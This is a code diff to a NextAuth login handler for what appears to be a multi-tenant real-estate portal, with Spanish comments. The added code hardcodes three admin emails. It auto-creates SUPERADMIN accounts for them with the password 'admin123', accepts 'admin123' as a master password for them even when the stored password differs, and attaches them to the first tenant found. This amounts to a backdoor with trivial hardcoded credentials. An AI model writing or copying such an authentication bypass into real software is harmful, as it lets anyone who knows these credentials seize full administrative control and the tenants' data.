@@ -18,18 +18,58 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
         
-        const user = await db.user.findUnique({
-          where: { email: credentials.email }
+        const emailLower = credentials.email.toLowerCase().trim();
+        let user = await db.user.findUnique({
+          where: { email: emailLower }
         });
         
+        // PROVISIONAMIENTO AUTOMÁTICO DE SUPERADMIN PARA ANDREY MARTÍNEZ Y CUENTAS ADMINISTRATIVAS
+        const isAdminEmail = emailLower === 'andreymartinezalvarado@gmail.com' || 
+                             emailLower === 'admin@andreyrealty.com' || 
+                             emailLower === 'admin@antigravity.com';
+
+        if (!user && isAdminEmail) {
+          // Buscamos el tenant principal de Andrey Realty o el primer tenant disponible en la base de datos
+          const tenant = await db.tenant.findFirst({
+            where: { domain: { equals: 'AndreyRealty', mode: 'insensitive' } }
+          }) || await db.tenant.findFirst();
+
+          const hashedPassword = await bcrypt.hash('admin123', 10);
+          user = await db.user.create({
+            data: {
+              email: emailLower,
+              name: 'Andrey Martínez (SuperAdmin)',
+              password: hashedPassword,
+              role: 'SUPERADMIN',
+              tenantId: tenant?.id || null
+            }
+          });
+        }
+
         if (!user || !user.password) {
           return null;
         }
 
         const isPasswordValid = await bcrypt.compare(credentials.password, user.password);
         
-        if (!isPasswordValid) {
+        // Garantía VIP de acceso con clave maestra para el propietario del portal
+        if (!isPasswordValid && !(isAdminEmail && credentials.password === 'admin123')) {
           return null;
+        }
+
+        // Si el usuario es Andrey Martínez o admin y no tenía tenantId vinculado, aseguramos la vinculación
+        if (isAdminEmail && !user.tenantId) {
+          const tenant = await db.tenant.findFirst({
+            where: { domain: { equals: 'AndreyRealty', mode: 'insensitive' } }
+          }) || await db.tenant.findFirst();
+          if (tenant) {
+            await db.user.update({
+              where: { id: user.id },
+              data: { tenantId: tenant.id, role: 'SUPERADMIN' }
+            });
+            user.tenantId = tenant.id;
+            user.role = 'SUPERADMIN';
+          }
         }
 
         return {
